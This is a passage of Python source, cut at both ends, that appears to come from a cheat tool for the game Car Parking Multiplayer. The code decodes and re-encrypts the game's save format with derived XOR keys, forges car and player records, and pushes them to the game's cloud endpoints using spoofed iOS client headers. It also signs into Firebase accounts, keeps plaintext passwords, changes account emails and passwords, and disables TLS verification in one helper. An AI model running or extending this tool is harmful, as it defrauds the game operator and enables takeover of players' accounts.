            decoded = decompress(xor_bytes(buf, make_xor_key(uid)))
            if decoded:
                parsed = try_parse(decoded)
                if parsed:
                    return {"success": True, "record": parsed}
        except Exception:
            pass

    for key in build_aes_keys(uid or "", password, email):
        plain = decrypt_aes(buf, key)
        if not plain:
            continue
        parsed = try_parse(plain)
        if parsed:
            return {"success": True, "record": parsed}
    return {"success": False, "message": "Could not decrypt"}

class Writer:
    def __init__(self):
        self._p: List[bytes] = []

    def write_byte(self, v):
        self._p.append(bytes([int(v or 0) & 0xFF]))

    def write_int(self, v):
        self._p.append(struct.pack("<i", int(v or 0)))

    def write_float(self, v):
        self._p.append(struct.pack("<f", float(v or 0.0)))

    def write_string(self, s):
        if s is None:
            self._p.append(struct.pack("<i", -1))
            return
        s = str(s)
        if s == "":
            self._p.append(struct.pack("<i", 0))
            return
        enc = s.encode("utf-8")
        self._p.append(struct.pack("<ii", -(len(enc)) - 1, len(s)) + enc)

    def write_list(self, lst, fn):
        if lst is None:
            self._p.append(struct.pack("<i", -1))
            return
        self._p.append(struct.pack("<i", len(lst)))
        for item in lst:
            fn(item)

    def write_equipment(self, data):
        if not data:
            self.write_byte(0)
            return
        self.write_byte(13)
        for key in ["hair", "face", "beard", "cap", "mask", "top", "gloves", "bag", "pants", "shoes", "glasses", "SelectedEquipments"]:
            self.write_list(data.get(key, []), self.write_int)
        self.write_int(data.get("Gender", 0))

    def write_plates(self, data):
        if not data:
            self.write_byte(0)
            return
        self.write_byte(1)
        plates = data.get("allPlates", [])
        self._p.append(struct.pack("<i", len(plates)))
        for plate in plates:
            self.write_byte(4)
            self.write_int(plate.get("plateId", 0))
            self.write_int(plate.get("frontCarId", 0))
            self.write_int(plate.get("rearCarId", 0))
            vinyls = plate.get("vinyls", [])
            self._p.append(struct.pack("<i", len(vinyls)))
            for vinyl in vinyls:
                self.write_byte(4)
                vecs = vinyl.get("vectors", [])
                self._p.append(struct.pack("<i", len(vecs)))
                for vec in vecs:
                    self._p.append(struct.pack("<fff", vec.get("x", 0), vec.get("y", 0), vec.get("z", 0)))
                self.write_list(vinyl.get("v", []), self.write_string)
                self.write_list(vinyl.get("floats", []), self.write_float)
                self.write_string(vinyl.get("text", ""))

    def write_car_id_status(self, data):
        if not data:
            self.write_byte(0)
            return
        self.write_byte(2)
        self.write_list(data.get("carGeneratedIDs", []), self.write_string)
        self.write_list(data.get("carStatus", []), self.write_int)

    def to_bytes(self):
        return b"".join(self._p)

FIELD_MAPPING = [
    (1, "localID"), (2, "money"), (3, "Name"), (4, "coin"), (5, "allData"),
    (6, "boughtFsos"), (7, "boughtPoliceLights"), (8, "boughtPoliceSirens"),
    (9, "FriendsID"), (10, "LevelsDoneTime"), (11, "floats"), (12, "integers"),
    (13, "fcar"), (14, "favouriteWheels"), (15, "favouriteVinyls"),
    (16, "favouriteEmojis"), (18, "emojiPacks"),
    (41, "personEquipmentsMale"), (42, "personEquipmentsFemale"),
    (43, "platesData"), (44, "carIDnStatus"), (45, "flags"),
    (46, "animations"), (48, "wheels"),
]
INT_LIST_FIELDS = {6, 7, 8, 12, 13, 14, 15, 16, 18, 46, 48}
FLOAT_LIST_FIELDS = {10, 11}
ALWAYS_SEND = {"allData"}

def _field_modified(new_value, old_value) -> bool:
    if new_value is None and old_value is None:
        return False
    if new_value is None or old_value is None:
        return True
    if type(new_value) != type(old_value):
        return True
    if isinstance(new_value, (dict, list)):
        return json.dumps(new_value, sort_keys=True) != json.dumps(old_value, sort_keys=True)
    return new_value != old_value

def serialize_field(fid: int, value: Any) -> Optional[bytes]:
    w = Writer()
    if fid in (1, 3, 5):
        w.write_string(value)
        return w.to_bytes()
    if fid in (2, 4):
        w.write_int(value or 0)
        return w.to_bytes()
    if fid == 9:
        friends = value or []
        w._p.append(struct.pack("<i", len(friends)))
        for friend in friends:
            friend = friend or {}
            w.write_byte(3)
            w.write_string(friend.get("id", ""))
            w.write_string(friend.get("Name", ""))
            w.write_string(friend.get("accountID", ""))
        return w.to_bytes()
    if fid in INT_LIST_FIELDS:
        w.write_list(value or [], w.write_int)
        return w.to_bytes()
    if fid in FLOAT_LIST_FIELDS:
        w.write_list(value or [], w.write_float)
        return w.to_bytes()
    if fid in (41, 42):
        w.write_equipment(value)
        return w.to_bytes()
    if fid == 43:
        w.write_plates(value)
        return w.to_bytes()
    if fid == 44:
        w.write_car_id_status(value)
        return w.to_bytes()
    if fid == 45:
        flags = value or {}
        w._p.append(struct.pack("<i", len(flags)))
        for key, val in flags.items():
            w.write_int(int(key))
            w.write_int(int(val))
        return w.to_bytes()
    return None

def build_payload(record: Dict[str, Any], uid: str, original: Optional[Dict[str, Any]] = None,
                  force_fields: Optional[set] = None) -> str:
    force_fields = set(force_fields or [])
    fields = []
    for fid, key in FIELD_MAPPING:
        value = record.get(key)
        if value is None:
            continue
        if key in ALWAYS_SEND:
            should_send = isinstance(value, str) and len(value) > 0
        elif key in force_fields:
            should_send = True
        elif original is not None:
            should_send = _field_modified(value, original.get(key))
        else:
            should_send = True
        if not should_send:
            continue
        raw = serialize_field(fid, value)
        if raw is not None:
            fields.append((fid, raw))

    parts = [struct.pack("<i", len(fields))]
    for fid, raw in fields:
        parts.append(struct.pack("<hi", fid, len(raw)))
        parts.append(raw)
    combined = b"".join(parts)
    compressed = brotli.compress(combined) if HAS_BROTLI else zlib.compress(combined)
    encrypted = xor_bytes(compressed, make_xor_key(uid))
    return base64.b64encode(encrypted).decode("ascii")
    

# CPM1 police activation car-save helpers copied from SIDALI.py source.
import uuid
import concurrent.futures
import requests
try:
    import brotli
except ImportError:
    brotli = None
CPM_CARS_FETCH_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2"
CPM_CARS_SAVE_URL = "https://europe-west1-cp-multiplayer.cloudfunctions.net/SaveCarsPartially8"
CPM_FIELD_NAMES = {1: "CarID", 2: "dataVersion", 3: "vectors", 4: "floats", 5: "gears", 6: "typeToInstall", 7: "BoughtParts", 8: "texts", 9: "flagID", 10: "fsoData", 11: "installedPoliceLights", 12: "Vynils", 13: "WindowVinyls"}
DEFAULT_CAR_FLOATS = "G9sA+B8Hbixn9nHUTIqgdq1SWBekTaBJwhFGYfbIX0OQ/UN0BMwph80jiDIIKJUcz/QEYAAH3hPAPsTf/ojeANa6AKO+ZtYHGAgVSLssPiMXoxo="
DEFAULT_CAR_BOUGHT_PARTS = "Gx8B+KcBAo7+wwYc5hgGwBPqBQACG97HCREF"
http_session = requests.Session()
http_adapter = requests.adapters.HTTPAdapter(pool_connections=12, pool_maxsize=30, max_retries=2)
http_session.mount("https://", http_adapter)
def _unpack_cpm1_mp_field(value, kind, default_b64=None):
    if isinstance(value, list) and value and not isinstance(value[0], str):
        return list(value)
    encoded = value if isinstance(value, str) and value else default_b64
    if not encoded:
        return []
    try:
        raw = base64.b64decode(encoded)
        try:
            decoded = brotli.decompress(raw)
        except Exception:
            decoded = raw
        count = struct.unpack_from("<i", decoded, 0)[0]
        if count < 0 or count > 10000:
            return []
        if kind == "int":
            return list(struct.unpack_from(f"<{count}i", decoded, 4))
        if kind == "float":
            return [round(float(item), 5) for item in struct.unpack_from(f"<{count}f", decoded, 4)]
        if kind == "vec3":
            values = struct.unpack_from(f"<{count * 3}f", decoded, 4)
            return [
                {"x": round(float(values[i * 3]), 5),
                 "y": round(float(values[i * 3 + 1]), 5),
                 "z": round(float(values[i * 3 + 2]), 5)}
                for i in range(count)
            ]
    except Exception:
        pass
    return []


def cpm1_ios_headers(token):
    return {
        'accept': '*/*',
        'authorization': f'Bearer {token}',
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'CarParking/265 CFNetwork/3860.600.12 Darwin/25.5.0',
        'x-client-platform': 'IOS',
        'x-client-version': '4.9.10',
        'x-client-deviceid': str(uuid.uuid4()).upper(),
        'x-request-nonce': str(uuid.uuid4()),
        'x-unity-version': '2022.3.62f2',
        'accept-encoding': 'gzip',
        'connection': 'Keep-Alive',
    }


def cpm1_write_memorypack_string(s):
    if s is None or s == "": return struct.pack("<i", 0)
    sb = str(s).encode("utf-8")
    return struct.pack("<ii", -len(sb) - 1, len(sb)) + sb


def cpm1_looks_like_base64(val):
    if not isinstance(val, str): return False
    if len(val) < 4 or len(val) % 4 != 0: return False
    return bool(re.match(r'^[A-Za-z0-9+/]+={0,2}$', val))


def cpm1_deserialize_string_list(b64):
    if not b64 or not isinstance(b64, str): return []
    try: compressed = base64.b64decode(b64)
    except: return []
    try: decompressed = brotli.decompress(compressed)
    except:
        try: decompressed = zlib.decompress(compressed, zlib.MAX_WBITS | 16)
        except: decompressed = compressed
    if not decompressed or len(decompressed) < 4: return []
    out = []
    pos = 0
    count = struct.unpack_from("<i", decompressed, 0)[0]
    pos = 4
    if count <= 0 or count > 100000: return []
    for _ in range(count):
        if pos + 4 > len(decompressed): break
        marker = struct.unpack_from("<i", decompressed, pos)[0]
        pos += 4
        if marker == 0:
            out.append("")
            continue
        if marker == -1: break
        if marker < -1:
            byte_len = -marker - 1
            if pos + 4 > len(decompressed): break
            pos += 4
        else:
            byte_len = marker
        if pos + byte_len > len(decompressed): break
        s = decompressed[pos:pos+byte_len].decode("utf-8", errors="replace")
        pos += byte_len
        out.append(s.replace("\x00", "").strip())
    return out


def cpm1_is_readonly_cpm_id(v):
    if not isinstance(v, str): return False
    x = v.strip().upper()
    return len(x) == 8 and bool(re.match(r'^[A-Z]{2}\d{6}$', x))


def cpm1_generate_random_cpm_id():
    L = string.ascii_uppercase
    D = string.digits
    return ''.join(random.choice(L) for _ in range(2)) + ''.join(random.choice(D) for _ in range(6))


def cpm1_resolve_cpm_id(record):
    val = (record or {}).get("localID")
    if not val or not cpm1_is_readonly_cpm_id(val): val = cpm1_generate_random_cpm_id()
    return str(val).strip().upper()


def cpm1_generated_id_from_car(car):
    for k in ("generatedID", "generatedId", "carGeneratedID", "carGeneratedId"):
        v = car.get(k)
        if v and isinstance(v, str): return v
    texts = car.get("texts")
    if isinstance(texts, str):
        try: texts = cpm1_deserialize_string_list(texts)
        except: texts = []
    if isinstance(texts, list):
        for v in texts:
            if v and isinstance(v, str) and '_' in v and re.search(r'\d', v): return v
    return None


def cpm1_merge_cars_by_id(*car_lists):
    merged = {}
    for lst in car_lists:
        if not isinstance(lst, list): continue
        for car in lst:
            if not isinstance(car, dict): continue
            try: cid = int(car.get("CarID"))
            except: continue
            if cid < 0: continue
            merged[cid] = car
    return [merged[k] for k in sorted(merged.keys())]


def cpm1_replace_uid_in_value(value, src_uid, tgt_uid):
    if not src_uid or src_uid == tgt_uid: return value
    if isinstance(value, str):
        if cpm1_looks_like_base64(value): return value
        return value.replace(str(src_uid), str(tgt_uid))
    if isinstance(value, list): return [cpm1_replace_uid_in_value(v, src_uid, tgt_uid) for v in value]
    if isinstance(value, dict): return {k: cpm1_replace_uid_in_value(v, src_uid, tgt_uid) for k, v in value.items()}
    return value


def cpm1_prepare_car(stock_car, cpm_id):
    car_copy = json.loads(json.dumps(stock_car))
    car_id = int(car_copy.get("CarID") or 0)
    if isinstance(car_copy.get("Vynils"), dict):
        car_copy["Vynils"]["CarID"] = car_id
    texts = car_copy.get("texts")
    if isinstance(texts, str):
        try: texts = cpm1_deserialize_string_list(texts)
        except: texts = []
    if not isinstance(texts, list): texts = []
    while len(texts) < 4: texts.append('')
    orig = texts[2]
    if isinstance(orig, str) and '_' in orig:
        parts = orig.split('_')
        texts[2] = f"{cpm_id}_" + "_".join(parts[1:])
    else:
        texts[2] = f"{cpm_id}_{car_id}XX000"
    car_copy["texts"] = texts
    return car_copy


def cpm1_build_car_entries(cars, cpm_id):
    entries = []
    for car in cars:
        try: cid = int(car.get("CarID"))
        except: continue
        if cid < 0: continue
        gen = cpm1_generated_id_from_car(car) or f"{cpm_id}_{cid}XX000"
        entries.append([cid, gen])
    return entries


def cpm1_entries_to_sparse(car_entries):
    if not car_entries:
        return {"carGeneratedIDs": [], "carStatus": []}
    ids = []
    for e in car_entries:
        try: ids.append(int(e[0]))
        except: pass
    ids = [i for i in ids if i >= 0]
    if not ids:
        return {"carGeneratedIDs": [], "carStatus": []}
    max_id = max(ids)
    gen_ids = [''] * (max_id + 1)
    statuses = [0] * (max_id + 1)
    for e in car_entries:
        try: cid = int(e[0])
        except: continue
        if 0 <= cid <= max_id:
            gen_ids[cid] = str(e[1]) if e[1] is not None else ''
            statuses[cid] = 1
    return {"carGeneratedIDs": gen_ids, "carStatus": statuses}


def cpm1_sanitize_car_for_encoding(car):
    clean = {}
    for key, value in car.items():
        if isinstance(value, str) and cpm1_looks_like_base64(value):
            clean[key] = value
            continue
        if key == 'floats':
            arr = value if isinstance(value, list) else []
            out = []
            for v in arr:
                try: f = float(v)
                except: f = 0.0
                out.append(f)
            while len(out) < 48: out.append(0.0)
            clean[key] = out
        elif key == 'gears':
            arr = value if isinstance(value, list) else []
            out = []
            for v in arr:
                try: f = float(v)
                except: f = -10.0
                out.append(f)
            clean[key] = out
        elif key == 'vectors':
            arr = value if isinstance(value, list) else []
            out = []
            for vec in arr:
                if isinstance(vec, dict):
                    try: x = float(vec.get('x') or 0)
                    except: x = 0.0
                    try: y = float(vec.get('y') or 0)
                    except: y = 0.0
                    try: z = float(vec.get('z') or 0)
                    except: z = 0.0
                    out.append({'x': x, 'y': y, 'z': z})
                else:
                    out.append({'x': 0.0, 'y': 0.0, 'z': 0.0})
            clean[key] = out
        elif key in ('typeToInstall', 'BoughtParts', 'fsoData', 'installedPoliceLights'):
            arr = value if isinstance(value, list) else []
            out = []
            for v in arr:
                try: iv = int(v)
                except: iv = 0
                out.append(iv)
            clean[key] = out
        elif key == 'texts':
            arr = value if isinstance(value, list) else []
            clean[key] = [str(v) if v is not None else '' for v in arr]
        elif key == 'Vynils':
            if isinstance(value, dict) and isinstance(value.get('allVynils'), list):
                fc = int(value.get('_fieldCount', 2) or 2)
                if fc < 2: fc = 2
                nv = {'_fieldCount': fc, 'allVynils': [], 'CarID': int(car.get('CarID', 0) or 0)}
                if isinstance(value.get('_remainingHex'), str): nv['_remainingHex'] = value['_remainingHex']
                for vinyl in value['allVynils']:
                    if not isinstance(vinyl, dict): continue
                    cv = {'_fieldCount': int(vinyl.get('_fieldCount', 6) or 6)}
                    for fn in ('position', 'scaleRotation', 'iconPosition'):
                        vec = vinyl.get(fn) or {}
                        if not isinstance(vec, dict): vec = {}
                        try: x = float(vec.get('x') or 0)
                        except: x = 0.0
                        try: y = float(vec.get('y') or 0)
                        except: y = 0.0
                        try: z = float(vec.get('z') or 0)
                        except: z = 0.0
                        cv[fn] = {'x': x, 'y': y, 'z': z}
                    cv['text'] = str(vinyl.get('text', '') or '')
                    cv['color'] = int(vinyl.get('color', 0) or 0)
                    cv['packedData'] = int(vinyl.get('packedData', 0) or 0)
                    nv['allVynils'].append(cv)
                clean[key] = nv
            else:
                clean[key] = value
        elif key == 'WindowVinyls':
            if isinstance(value, list):
                out = []
                for vinyl in value:
                    if not isinstance(vinyl, dict): continue
                    cv = {'_fieldCount': int(vinyl.get('_fieldCount', 6) or 6)}
                    for fn in ('position', 'scaleRotation', 'iconPosition'):
                        vec = vinyl.get(fn) or {}
                        if not isinstance(vec, dict): vec = {}
                        try: x = float(vec.get('x') or 0)
                        except: x = 0.0
                        try: y = float(vec.get('y') or 0)
                        except: y = 0.0
                        try: z = float(vec.get('z') or 0)
                        except: z = 0.0
                        cv[fn] = {'x': x, 'y': y, 'z': z}
                    cv['text'] = str(vinyl.get('text', '') or '')
                    cv['color'] = int(vinyl.get('color', 0) or 0)
                    cv['packedData'] = int(vinyl.get('packedData', 0) or 0)
                    out.append(cv)
                clean[key] = out
            else:
                clean[key] = value
        elif key in ('CarID', 'dataVersion', 'flagID'):
            try: clean[key] = int(value)
            except: clean[key] = 0
        else:
            clean[key] = value
    return clean


def cpm1_encode_field_value_binary(name, value):
    if name == 'vectors':
        if not isinstance(value, list): value = []
        buf = struct.pack("<i", len(value))
        for vec in value:
            x = float(vec.get('x') or 0) if isinstance(vec, dict) else 0.0
            y = float(vec.get('y') or 0) if isinstance(vec, dict) else 0.0
            z = float(vec.get('z') or 0) if isinstance(vec, dict) else 0.0
            buf += struct.pack("<fff", x, y, z)
        return buf
    if name in ('floats', 'gears'):
        if not isinstance(value, list): value = []
        buf = struct.pack("<i", len(value))
        for v in value:
            try: f = float(v)
            except: f = 0.0
            buf += struct.pack("<f", f)
        return buf
    if name in ('typeToInstall', 'BoughtParts', 'fsoData', 'installedPoliceLights'):
        if not isinstance(value, list): value = []
        buf = struct.pack("<i", len(value))
        for v in value:
            try: iv = int(v)
            except: iv = 0
            buf += struct.pack("<i", iv)
        return buf
    if name == 'texts':
        if not isinstance(value, list): value = []
        buf = struct.pack("<i", len(value))
        for v in value:
            buf += cpm1_write_memorypack_string(str(v) if v is not None else '')
        return buf
    if name == 'Vynils':
        # Some CPM1 GetAllCars2 responses expose Vynils only as the raw
        # memorypack vinyl-list bytes. Preserve those bytes exactly instead
        # of declaring the source unreadable.
        if isinstance(value, dict) and value.get('_raw_list') is not None:
            raw_list = value.get('_raw_list')
            if isinstance(raw_list, str):
                try: raw_list = base64.b64decode(raw_list, validate=True)
                except Exception: raw_list = None
            if isinstance(raw_list, (bytes, bytearray)) and len(raw_list) >= 4:
                fc = int(value.get('_fieldCount', 2) or 2)
                if fc < 1: fc = 2
                out = bytes([fc & 0xFF]) + bytes(raw_list)
                if fc >= 2:
                    try: carid = int(value.get('CarID') or 0)
                    except Exception: carid = 0
                    out += struct.pack('<i', carid)
                return out
        if not isinstance(value, dict) or not isinstance(value.get('allVynils'), list): return b""
        fc = int(value.get('_fieldCount', 2) or 2)
        parts = [bytes([fc & 0xFF])]
        if fc == 0: return b"".join(parts)
        parts.append(struct.pack("<i", len(value['allVynils'])))
        for vinyl in value['allVynils']:
            if not isinstance(vinyl, dict):
                parts.append(bytes([0]))
                continue
            vfc = int(vinyl.get('_fieldCount', 6) or 6)
            parts.append(bytes([vfc & 0xFF]))
            if vfc == 0: continue
            for fn in ('position', 'scaleRotation', 'iconPosition'):
                vec = vinyl.get(fn) if isinstance(vinyl.get(fn), dict) else {}
                x = float(vec.get('x') or 0)
                y = float(vec.get('y') or 0)
                z = float(vec.get('z') or 0)
                parts.append(struct.pack("<fff", x, y, z))
            parts.append(cpm1_write_memorypack_string(str(vinyl.get('text', '') or '')))
            parts.append(struct.pack("<I", int(vinyl.get('color', 0) or 0) & 0xFFFFFFFF))
            try: pd = int(vinyl.get('packedData', 0) or 0)
            except: pd = 0
            parts.append(struct.pack("<q", pd))
        if fc >= 2:
            carid = value.get('CarID')
            if carid is None and isinstance(value.get('_remainingHex'), str) and value['_remainingHex']:
                try:
                    hx = bytes.fromhex(value['_remainingHex'])
                    carid = struct.unpack_from("<i", hx, 0)[0]
                except: carid = 0
            try: carid = int(carid) if carid is not None else 0
            except: carid = 0
            parts.append(struct.pack("<i", carid))
        return b"".join(parts)
    if name == 'WindowVinyls':
        if not isinstance(value, list): value = []
        parts = [struct.pack("<i", len(value))]
        for vinyl in value:
            if not isinstance(vinyl, dict):
                parts.append(bytes([0]))
                continue
            vfc = int(vinyl.get('_fieldCount', 6) or 6)
            parts.append(bytes([vfc & 0xFF]))
            if vfc == 0: continue
            for fn in ('position', 'scaleRotation', 'iconPosition'):
                vec = vinyl.get(fn) if isinstance(vinyl.get(fn), dict) else {}
                x = float(vec.get('x') or 0)
                y = float(vec.get('y') or 0)
                z = float(vec.get('z') or 0)
                parts.append(struct.pack("<fff", x, y, z))
            parts.append(cpm1_write_memorypack_string(str(vinyl.get('text', '') or '')))
            parts.append(struct.pack("<I", int(vinyl.get('color', 0) or 0) & 0xFFFFFFFF))
            try: pd = int(vinyl.get('packedData', 0) or 0)
            except: pd = 0
            parts.append(struct.pack("<q", pd))
        return b"".join(parts)
    return b""


def cpm1_encode_car_to_memorypack(car):
    fields = []
    for fid, name in CPM_FIELD_NAMES.items():
        if name in car and car[name] is not None:
            fields.append((fid, name, car[name]))
    fields.sort(key=lambda x: x[0])
    parts = [struct.pack("<i", len(fields))]
    for fid, name, value in fields:
        parts.append(struct.pack("<h", fid))
        if name in ('CarID', 'dataVersion', 'flagID'):
            try: iv = int(value)
            except: iv = 0
            parts.append(cpm1_write_memorypack_string(str(iv)))
        elif isinstance(value, str) and cpm1_looks_like_base64(value):
            parts.append(cpm1_write_memorypack_string(value))
        else:
            binv = cpm1_encode_field_value_binary(name, value)
            try: compressed = brotli.compress(binv, quality=4)
            except: compressed = brotli.compress(binv)
            parts.append(cpm1_write_memorypack_string(base64.b64encode(compressed).decode('ascii')))
    return b"".join(parts)


def cpm1_encrypt_car_for_save(car, uid):
    clean = cpm1_sanitize_car_for_encoding(car)
    key = make_xor_key(uid)
    mp = cpm1_encode_car_to_memorypack(clean)
    compressed = brotli.compress(mp, quality=4)
    encrypted = xor_bytes(compressed, key)
    return "__ver1__" + base64.b64encode(encrypted).decode('ascii')


def cpm1_fetch_cars_v2(token):
    try:
        resp = http_session.post(CPM_CARS_FETCH_URL, json={"data": ""}, headers=cpm1_ios_headers(token), timeout=20)
        if resp.status_code < 200 or resp.status_code >= 300:
            return {"success": False, "error": f"HTTP {resp.status_code}", "status": resp.status_code, "cars": []}
        parsed = resp.json() if resp.text else {}
        if isinstance(parsed, str):
            try: parsed = json.loads(parsed)
            except: pass
        raw_result = None
        if isinstance(parsed, dict):
            if parsed.get("result") is not None:
                raw_result = parsed["result"]
            elif isinstance(parsed.get("data"), dict) and parsed["data"].get("result") is not None:
                raw_result = parsed["data"]["result"]
        if raw_result is None:
            return {"success": True, "cars": []}
        cars = []
        try: cars = json.loads(raw_result)
        except:
            m = re.search(r'\[\s*\{[\s\S]*\}\s*\]', str(raw_result))
            if m:
                try: cars = json.loads(m.group(0))
                except: pass
        return {"success": True, "cars": cars if isinstance(cars, list) else []}
    except Exception as e:
        return {"success": False, "error": str(e), "cars": []}


def cpm1_save_car_encrypted_v2(token, car, uid, retries=2):
    try: payload = cpm1_encrypt_car_for_save(car, uid)
    except Exception as e: return {"success": False, "error": f"encode:{str(e)[:80]}"}
    headers = cpm1_ios_headers(token)
    last = {"success": False, "error": "max_retries"}
    for attempt in range(1, retries + 1):
        try:
            resp = http_session.post(CPM_CARS_SAVE_URL, json={"data": payload}, headers=headers, timeout=30)
            if resp.status_code < 300:
                return {"success": True, "status": resp.status_code, "data": resp.text}
            if resp.status_code in (401, 403):
                return {"success": False, "auth": True, "status": resp.status_code, "error": f"HTTP {resp.status_code}"}
            last = {"success": False, "status": resp.status_code, "error": f"HTTP {resp.status_code}"}
        except Exception as e:
            last = {"success": False, "error": str(e)[:120]}
        # Retry immediately; no artificial activation delay.
    return last



class CPMNukerRAM:
    def __init__(self):
        self.tokens: Dict[int, Dict[str, Any]] = {}
        self.records: Dict[str, Dict[str, Any]] = {}

    def _ck(self, uid: int, email: Optional[str] = None) -> str:
        if email:
            return f"{uid}_{email}"
        td = self.get_token_data(uid)
        return f"{uid}_{td['email']}" if td and td.get("email") else str(uid)

    def save_token(self, uid: int, auth: str, email: str, pw: Optional[str] = None,
                   rt: Optional[str] = None, fuid: Optional[str] = None):
        if uid not in self.tokens:
            self.tokens[uid] = {}
        self.tokens[uid].update({
            "auth_token": auth, "email": email, "password": pw,
            "refresh_token": rt, "firebase_uid": fuid,
            "token_expires_at": time.time() + 3600
        })

    def get_token_data(self, uid: int) -> Optional[Dict[str, Any]]:
        return self.tokens.get(uid)

    def update_token(self, uid: int, auth: str, rt: Optional[str] = None):
        if uid in self.tokens:
            self.tokens[uid]["auth_token"] = auth
            self.tokens[uid]["token_expires_at"] = time.time() + 3600
            if rt:
                self.tokens[uid]["refresh_token"] = rt

    def is_expired(self, uid: int) -> bool:
        td = self.get_token_data(uid)
        return not td or not td.get("token_expires_at") or td["token_expires_at"] < time.time()

    def get_record(self, uid: int, email: Optional[str] = None) -> Dict[str, Any]:
        ck = self._ck(uid, email)
        return self.records.get(ck, {})

    def set_record(self, uid: int, data: Dict[str, Any], email: Optional[str] = None):
        ck = self._ck(uid, email)
        self.records[ck] = data

    async def _post(self, url: str, payload: Dict[str, Any], headers: Dict[str, str]) -> Optional[Dict[str, Any]]:
        try:
            clean_headers = {k: v for k, v in headers.items() if k.lower() != "host"}
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as s:
                async with s.post(url, json=payload, headers=clean_headers) as resp:
                    text = await resp.text()
                    try:
                        return json.loads(text)
                    except Exception:
                        return {"raw": text, "status": resp.status}
        except Exception as exc:
            logger.error("HTTP error: %s", exc)
            return None

    async def login(self, email: str, password: str) -> Dict[str, Any]:
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FK}"
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
            "X-Unity-Version": "2022.3.62f2",
        }
        payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
        result = await self._post(url, payload, headers)
        if not result:
            return {"ok": False, "message": "NETWORK_ERROR"}
        if "idToken" in result:
            return {
                "ok": True, "message": "OK",
                "auth": result["idToken"],
                "refresh_token": result.get("refreshToken", ""),
                "firebase_uid": result.get("localId", ""),
            }
        err = str(result.get("error", {}).get("message", "")).upper()
        return {"ok": False, "message": err}

    async def login_cp2(self, email: str, password: str) -> Dict[str, Any]:
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={FK_CP2}"
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
            "X-Unity-Version": "2022.3.62f2",
        }
        payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
        result = await self._post(url, payload, headers)
        if not result:
            return {"ok": False, "message": "NETWORK_ERROR"}
        if "idToken" in result:
            return {
                "ok": True, "message": "OK",
                "auth": result["idToken"],
                "refresh_token": result.get("refreshToken", ""),
                "firebase_uid": result.get("localId", ""),
            }
        err = str(result.get("error", {}).get("message", "")).upper()
        return {"ok": False, "message": err}

    async def change_email(self, uid: int, new_email: str) -> Dict[str, Any]:
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return {"ok": False, "message": msg}
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK}"
        payload = {"idToken": auth, "email": new_email, "returnSecureToken": True}
        res = await self._post(url, payload, GAME_HEADERS)
        if res and "email" in res:
            if uid in self.tokens:
                old_email = self.tokens[uid].get("email")
                self.tokens[uid]["email"] = res["email"]
                if "idToken" in res:
                    self.tokens[uid]["auth_token"] = res["idToken"]
                if "refreshToken" in res:
                    self.tokens[uid]["refresh_token"] = res["refreshToken"]
                if old_email and f"{uid}_{old_email}" in self.records:
                    rec = self.records.pop(f"{uid}_{old_email}")
                    self.records[f"{uid}_{res['email']}"] = rec
            return {"ok": True, "email": res["email"]}
        return {"ok": False, "error": res.get("error", {}).get("message", "FAILED") if res else "FAILED"}

    async def change_password(self, uid: int, new_password: str) -> Dict[str, Any]:
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return {"ok": False, "message": msg}
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK}"
        payload = {"idToken": auth, "password": new_password, "returnSecureToken": True}
        res = await self._post(url, payload, GAME_HEADERS)
        if res and "localId" in res:
            if uid in self.tokens:
                self.tokens[uid]["password"] = new_password
                if "idToken" in res:
                    self.tokens[uid]["auth_token"] = res["idToken"]
                if "refreshToken" in res:
                    self.tokens[uid]["refresh_token"] = res["refreshToken"]
            return {"ok": True}
        return {"ok": False, "error": res.get("error", {}).get("message", "FAILED") if res else "FAILED"}

    async def change_email_cp2(self, uid: int, new_email: str) -> Dict[str, Any]:
        td = self.get_token_data(uid)
        auth = td.get("cp2_token") if td else None
        if not auth:
            return {"ok": False, "message": "NO_CP2_TOKEN"}
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK_CP2}"
        payload = {"idToken": auth, "email": new_email, "returnSecureToken": True}
        res = await self._post(url, payload, GAME_HEADERS)
        if res and "email" in res:
            if uid in self.tokens:
                self.tokens[uid]["cp2_email"] = res["email"]
                if "idToken" in res: self.tokens[uid]["cp2_token"] = res["idToken"]
                if "refreshToken" in res: self.tokens[uid]["cp2_refresh_token"] = res["refreshToken"]
            return {"ok": True, "email": res["email"]}
        return {"ok": False, "error": res.get("error", {}).get("message", "FAILED") if res else "FAILED"}

    async def change_password_cp2(self, uid: int, new_password: str) -> Dict[str, Any]:
        td = self.get_token_data(uid)
        auth = td.get("cp2_token") if td else None
        if not auth:
            return {"ok": False, "message": "NO_CP2_TOKEN"}
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK_CP2}"
        payload = {"idToken": auth, "password": new_password, "returnSecureToken": True}
        res = await self._post(url, payload, GAME_HEADERS)
        if res and "localId" in res:
            if uid in self.tokens:
                self.tokens[uid]["cp2_password"] = new_password
                if "idToken" in res: self.tokens[uid]["cp2_token"] = res["idToken"]
                if "refreshToken" in res: self.tokens[uid]["cp2_refresh_token"] = res["refreshToken"]
            return {"ok": True}
        return {"ok": False, "error": res.get("error", {}).get("message", "FAILED") if res else "FAILED"}

    async def _refresh(self, uid: int) -> Tuple[bool, str]:
        td = self.get_token_data(uid)
        if not td:
            return False, "NO_TOKEN"
        rt, em, pw = td.get("refresh_token"), td.get("email"), td.get("password")
        if rt:
            try:
                result = await self._post(
